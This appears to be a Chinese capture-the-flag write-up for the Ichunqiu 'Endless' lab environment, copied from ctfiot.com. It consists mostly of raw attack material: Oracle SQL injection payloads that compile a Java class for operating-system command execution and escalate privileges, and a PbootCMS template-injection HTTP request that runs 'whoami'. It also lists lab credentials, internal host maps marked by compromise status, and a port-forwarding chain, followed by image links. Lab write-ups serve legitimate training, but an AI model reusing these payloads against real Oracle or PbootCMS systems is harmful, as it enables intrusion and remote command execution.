# Ichunqiu云境 —— Endless(无间计划) Writeup

> 原文: https://www.ctfiot.com/105171.html
> ID: 105171


```
1. 创建JAVA Source
admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"n";myReader.close();
return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual)>1 --

2.提权
admin' AND (SELECT dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.dbms_cdc_publish.create_change_set('''' a'''',''''a'''',''''a''''''''||TEST.pwn()||''''''''a'''',''''Y'''',s ysdate,sysdate);end;''; commit; end;') from dual)>1--

3.创建函数
admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LINXRUNCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual)>1--

4.查询创建的函数
admin' union select null,(select object_name from all_objects where object_name ='LINXRUNCMD' and rownum=1),null from dual--

5.查询java source
admin' union select null,(select object_name from all_objects where object_name ='LinxUtil'),null from dual--

6.命令执行
admin' union select null,(select LINXRUNCMD('whoami') from dual),null from dual--
GET /?a=}{pboot{user:
password}:if(("sysx74em")("whoami"));//)}xxx{/pboot{user:
password}:if} HTTP/1.1
Host: 39.98.94.70:80
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://39.98.94.70/admin.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: lg=cn; PbootSystem=h6o5ta1btl6o32bi184ula183l
Connection: close
Content-Length: 0
username: usera@pentest.com
password：Admin3gv83
172.24.7.5 DCadmin.pen.me (当前不在我们的范围内)
172.24.7.48 IZAYSXE6VCUHB4Z.pentest.me (在范围内，未拿下)
172.24.7.16 IZMN9U6ZO3VTRNZ.pentest.me (在范围内，已经拿下)
172.24.7.3 DC.pentest.me (在范围内，未拿下)
172.24.7.43 IZMN9U6ZO3VTRPZ.pentest.me (在范围内，未拿下)
172.24.7.16:80（双网卡，通172.23.4.0/24） ---forward--- 172.23.4.19:81(SSH) ---forward--- localhost:79 ---forward--- kali:
8001
pen.me
    172.25.12.7 (172.24.7.5) DCadmin.pen.me (在范围内，还没拿下)
    172.25.12.19 IZ1TUCEKFDPCEMZ.pen.me (在范围内，还没拿下)
    172.25.12.29 IZ88QYK8Y8Y3VXZ.pen.me (在范围内，还没拿下)

pentest.me
    172.25.12.9 (172.24.7.3) DC.pentest.me (在范围内，已经拿下)
    172.24.7.48 IZAYSXE6VCUHB4Z.pentest.me (在范围内，已经拿下)
    172.24.7.16 IZMN9U6ZO3VTRNZ.pentest.me (在范围内，已经拿下)
    172.24.7.3 DC.pentest.me (在范围内，已经拿下)
    172.24.7.43 IZMN9U6ZO3VTRPZ.pentest.me (在范围内，有管理员凭据，还没登录上去)
confluence: 172.24.7.27:
8090
gitlab: 172.24.7.23
IP: 172.26.8.16
username: sa
password: sqlserver_2022
IP: 172.26.8.16
username: sa
password: sqlserver_2022
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/9-1679707416.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/0-1679707416.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/1-1679707417.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/1-1679707417.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/2-1679707418.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/0-1679707418.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/3-1679707419.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/0-1679707419.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/5-1679707420.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/7-1679707421.png)